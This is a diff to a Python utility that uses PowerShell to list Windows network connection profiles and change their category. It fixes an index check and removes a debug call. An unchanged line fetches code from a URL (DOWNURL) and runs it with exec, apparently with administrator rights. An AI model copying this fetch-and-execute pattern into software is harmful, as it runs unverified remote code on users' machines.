@@ -113,6 +113,7 @@ class NETWORK:
     def psex(pscommand):
         extend = ''
         if (platform.platform().startswith("Windows-7")):
+            ''' https://gist.github.com/ITMicaH/65cd447d1ba10ed9accc '''
             ps1 = os.path.join(os.getcwd(), "NetConnectionProfiles.ps1")
             extend = f"Import-Module \'{ps1}\'; "
         return subprocess.getoutput( \
@@ -148,13 +149,10 @@ class NETWORK:
         print()
 
         i = int(input(f"switch to {NetworkCategory.lower()} network:").lower()[0])
-        if (i < 1 or i > len(self.ethernet)): return
+        if (i < 1 or i > len(self.network)): return
 
         NETWORK.psex(f"Set-NetConnectionProfile -Name \'{self.network[i-1].name}\' -NetworkCategory {NetworkCategory}")
 
-
-
-NETWORK().connections(); exit(0)
 
 
 ''' runas `administrator` '''
@@ -165,7 +163,7 @@ exec(HTTPGET(DOWNURL).read().decode('utf-8'))
 
 
 ''' reference target host '''
-WDKTEST.NETWORK().network(); print()
+NETWORK().reference(); print()
 
 
 '''  '''
